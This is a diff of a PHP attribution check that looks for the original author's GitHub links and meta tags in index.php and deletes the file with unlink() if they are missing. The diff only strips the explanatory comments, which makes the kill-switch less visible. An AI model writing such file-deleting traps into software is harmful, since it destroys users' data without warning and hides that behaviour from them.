@@ -19,7 +19,7 @@ function verifyDeveloperAttribution()
 
     $indexContent = file_get_contents('index.php');
 
-    // Original identity checks
+    
     $hasOriginalGithubLink = strpos($indexContent, 'github.com/manasess896"') !== false ||
         strpos($indexContent, 'github.com/Manasess896"') !== false;
 
@@ -31,7 +31,6 @@ function verifyDeveloperAttribution()
 
     $hasOriginalAuthorMeta = strpos($indexContent, '<meta name="author" content="manases">') !== false;
 
-    // New identity checks - replace the placeholders with your new identity values
     $hasNewGithubLink = strpos($indexContent, 'github.com/manasess"') !== false;
 
     $hasNewAttribution = strpos($indexContent, 'Created by @manases') !== false;
@@ -40,7 +39,6 @@ function verifyDeveloperAttribution()
         strpos($indexContent, 'github.com/your-new-username" class="github-corner"') !== false;
     $hasNewAuthorMeta = strpos($indexContent, '<meta name="author" content="your-new-name">') !== false;
 
-    // Check if either original or new identity attributes are present
     $hasValidGithubLink = $hasOriginalGithubLink || $hasNewGithubLink;
     $hasValidAttribution = $hasOriginalAttribution || $hasNewAttribution;
     $hasValidGithubCorner = $hasOriginalGithubCorner || $hasNewGithubCorner;
@@ -49,7 +47,7 @@ function verifyDeveloperAttribution()
     return $hasValidGithubLink && $hasValidAttribution && $hasValidGithubCorner && $hasValidAuthorMeta;
 }
 
-// System integrity verification
+
 if (!verifyDeveloperAttribution()) {
     if (file_exists('index.php')) {
         unlink('index.php');
